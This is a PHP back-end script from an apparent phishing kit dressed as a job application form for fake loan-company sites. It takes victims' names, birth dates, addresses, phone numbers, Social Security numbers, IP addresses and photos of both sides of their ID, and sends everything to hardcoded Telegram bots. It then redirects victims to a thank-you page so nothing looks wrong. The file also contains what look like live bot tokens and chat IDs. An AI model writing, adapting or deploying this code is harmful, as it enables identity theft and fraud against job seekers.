<?php
ob_start(); // Start output buffering to prevent headers already sent

// include 'firewall.php';

// 🌐 Site map: define how each site should behave
$site_map = [
    "upstartloan.rf.gd" => [
        "bots" => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ["token" => "7683707216:AAFKB6Izdj c-M2mIaR_vRf-9Ha7CkEh7rA", "chat_id" => "7510889526"],
        ],
        "redirect" => "https://upstartloan.rf.gd/cache_site/thankyou.html"
    ],

    'upstarts.onrender.com' => [
        'bots' => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '', 'chat_id' => '']
        ],
        'redirect' => 'https://upstarts.onrender.com/cache_site/thankyou.html'
    ],
    

    // Add more sites...
];

// 🧠 Determine origin domain (not PHP host)
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';
$config = $site_map[$domain] ?? null;

if (!$config) {
    http_response_code(403);
    exit("Access denied: Unauthorized site ($domain).");
}

// 🚀 Handle POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 📝 Log file
    $log_file = __DIR__ . "/logs/job_applications.txt";
    if (!file_exists(dirname($log_file))) {
        mkdir(dirname($log_file), 0777, true);
    }

    function log_entry($msg) {
        global $log_file;
        file_put_contents($log_file, "[" . date("Y-m-d H:i:s") . "] $msg\n", FILE_APPEND);
    }

    // 📋 Get form fields
    $first = htmlspecialchars($_POST['q11_fullName']['first'] ?? '');
    $middle = htmlspecialchars($_POST['q11_fullName']['middle'] ?? '');
    $last = htmlspecialchars($_POST['q11_fullName']['last'] ?? '');
    $full_name = trim("$first $middle $last");

    $dob = sprintf("%04d-%02d-%02d", 
        $_POST['q18_birthDate']['year'] ?? 0, 
        $_POST['q18_birthDate']['month'] ?? 0, 
        $_POST['q18_birthDate']['day'] ?? 0);

    $address = htmlspecialchars(($_POST['q16_currentAddress']['addr_line1'] ?? '') . " " .
                                ($_POST['q16_currentAddress']['addr_line2'] ?? '') . ", " .
                                ($_POST['q16_currentAddress']['city'] ?? '') . ", " .
                                ($_POST['q16_currentAddress']['state'] ?? '') . ", " .
                                ($_POST['q16_currentAddress']['postal'] ?? ''));

    $email = htmlspecialchars($_POST['q12_emailAddress'] ?? '');
    $phone = htmlspecialchars($_POST['q13_phoneNumber13']['full'] ?? '');
    $position = htmlspecialchars($_POST['q14_positionApplied'] ?? '');
    $job_type = htmlspecialchars($_POST['q24_jobType'] ?? '');
    $source = htmlspecialchars($_POST['q21_howDid21'] ?? '');
    $ssn = htmlspecialchars($_POST['q25_socSec'] ?? '');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $timestamp = date("Y-m-d H:i:s");

    // 📦 Upload handler
    function uploadFile($key, $prefix) {
        $upload_dir = __DIR__ . "/uploads/";
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);

        if (!empty($_FILES[$key]['name'][0])) {
            $original = $_FILES[$key]['name'][0];
            $ext = pathinfo($original, PATHINFO_EXTENSION);
            $name = $prefix . "_" . time() . "." . $ext;
            $path = $upload_dir . $name;

            if (move_uploaded_file($_FILES[$key]['tmp_name'][0], $path)) {
                return $path;
            }
        }
        return null;
    }

    $front_id = uploadFile("q17_uploadYour", "front_id");
    $back_id = uploadFile("q26_identityVerification", "back_id");

    // 🧾 Format Telegram message
    $message = "📝 *New Job Application*\n\n" .
               "👤 *Name:* $full_name\n" .
               "🎂 *DOB:* $dob\n" .
               "🏠 *Address:* $address\n" .
               "📧 *Email:* $email\n" .
               "📞 *Phone:* $phone\n" .
               "💼 *Position:* $position\n" .
               "📌 *Job Type:* $job_type\n" .
               "🗣 *Referred By:* $source\n" .
               "🔐 *SSN:* $ssn\n" .
               "🕒 *Submitted:* $timestamp\n" .
               "🌐 *IP:* $ip\n" .
               "📎 *ID Uploaded:* " . ($front_id && $back_id ? "✅ Yes" : "❌ No");

    // 📬 Send text to bots
    foreach ($config['bots'] as $bot) {
        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
        $data = ['chat_id' => $bot['chat_id'], 'text' => $message, 'parse_mode' => 'Markdown'];

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data
        ]);
        curl_exec($ch);
        curl_close($ch);
    }

    // 📤 Send files
    function sendFile($file, $caption, $bots) {
        if (!$file || !is_string($file) || !file_exists($file)) return;
        $is_image = in_array(strtolower(pathinfo($file, PATHINFO_EXTENSION)), ['jpg', 'jpeg', 'png', 'gif']);

        foreach ($bots as $bot) {
            $endpoint = $is_image ? "sendPhoto" : "sendDocument";
            $url = "https://api.telegram.org/bot{$bot['token']}/$endpoint";
            $payload = [
                'chat_id' => $bot['chat_id'],
                ($is_image ? 'photo' : 'document') => new CURLFile(realpath($file)),
                'caption' => $caption,
                'parse_mode' => 'Markdown'
            ];

            $ch = curl_init($url);
            curl_setopt_array($ch, [CURLOPT_POST => true, CURLOPT_POSTFIELDS => $payload, CURLOPT_RETURNTRANSFER => true]);
            curl_exec($ch);
            curl_close($ch);
        }
    }

    sendFile($front_id, "📎 *Front ID* for $full_name", $config['bots']);
    sendFile($back_id, "📎 *Back ID* for $full_name", $config['bots']);

    log_entry("✅ [$domain] Job application received from $ip ($full_name)");

    ob_end_clean(); // Discard any unexpected output before redirect
    header("Location: " . $config['redirect']);
    exit;
}
?>
